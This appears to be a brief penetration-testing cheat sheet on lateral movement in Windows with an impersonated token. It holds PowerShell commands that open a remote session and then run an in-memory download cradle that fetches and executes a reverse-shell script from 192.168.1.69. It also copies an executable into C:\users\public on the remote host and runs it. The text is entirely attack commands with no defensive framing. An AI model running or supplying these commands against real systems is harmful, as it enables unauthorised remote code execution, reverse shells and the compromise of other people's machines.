### on remote machine with impersonated token
```powershell
$sess = New-PSSession -computer ComputerHostname
# reverse powershell
Invoke-Command -Session $sess -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
```

#### copy and run file over session
```powershell
Copy-Item "c:\path\to\file.exe" -Destination "C:\users\public\" -ToSession $sess
Invoke-Command -Session $sess -ScriptBlock { "C:\users\public\file.exe"  }
```

